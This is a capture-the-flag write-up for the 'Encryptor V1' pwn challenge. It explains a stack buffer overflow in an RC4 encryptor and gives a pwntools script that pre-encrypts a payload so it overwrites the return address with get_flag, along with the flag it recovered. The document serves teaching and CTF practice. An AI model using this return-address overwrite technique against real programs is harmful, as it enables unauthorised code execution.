# Encryptor V1

## _Analyzing The Source_

The challenge had more than one path to solve it, first when i took a look at the source code i thought it was a **format string attack** challenge because of the `printf(ciphertext);` instruction, so let's say i lost a bit of time in that direction , then after talking with the author and checking the code i started getting more familiar with and i discovered the **BOF**.

The program was reading uptop `1024` chars (in case no _NULL BYTE_ is found, i will get to this later when talking about the exploit) but the `ciphertext` array was supposed to only have a max of `256` chars ( **unsigned char ciphertext`[BUFFER_SIZE]`;**) where **BUFFER_SIZE** = 256, so the BOF is located in `pseudo_random_generation` function which has the for loop that was going from `0` to the length of the `plaintext`( **char plaintext`[1024]`;**) and asigning encrypted chars to the `ciphertext` variable.

```c
int pseudo_random_generation(unsigned char *state, char *plaintext, unsigned char *ciphertext)
{

    int i = 0;
    int j = 0;

    for (size_t n = 0, len = strlen(plaintext); n < len; n++)
    {
        i = (i + 1) % STATE_SIZE;
        j = (j + state[i]) % STATE_SIZE;

        swap(&state[i], &state[j]);
        unsigned char rnd = state[(state[i] + state[j]) % STATE_SIZE];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}
```

## _Exploitation_

The idea was to overwrite the `rip` pointer with the address of `get_flag` function, and since the ASLR protection was disabled the address of the `get_flag` will be the same on each run, so using `gdb` i examined the address of `get_flag` using the command :

```
x get_flag
```

> Note: You can also use `readelf -s encryptor` to see the entries in symbol table section of the file and get the address from there.

`GET_FLAG` = `0x0000000000401216`.

So our payload needs to be as follow : 264 chars + `GET_FLAG`, taking into account the 264 chars must have no `\0` (a NULL BYTE) otherwise the program will stop reading chars,but because of the `RC4` encryption we are not able to pass the payload as it is because it will be encrypted and we lose the address of `GET_FLAG`,so we need to encrypt it ourselve first then to send the resulted text to the binary because when the it tries to encrypt our input we will get the payload we want, i tried several prefix padding in order to not have a `NULL BYTE` in the middle when payload gets encrypted.

And Voila : `IngeHack{ch0$3n_c1ph3rt3xt_4tt4ck_1npwn!!}`

```python
from pwn import *
from arc4 import ARC4

GET_FLAG = 0x0000000000401216
LOCAL = False
if LOCAL:
    elf = ELF('./encryptor')
    p = elf.process()
else:
    p = remote("pwn.ingehack.ingeniums.club", 2001)

key = 'AA'

data_offset = b"BCDEFG"*12 + b"OB"*47 + b"HO" * 39 + b"PS"*10
payload = ARC4(key).decrypt(data_offset + p64(GET_FLAG))

print(p.recvuntil("Key: \n"))
p.sendline(key)
p.recvline()
p.sendline(payload)
print(p.recv())
print(p.recv())
```
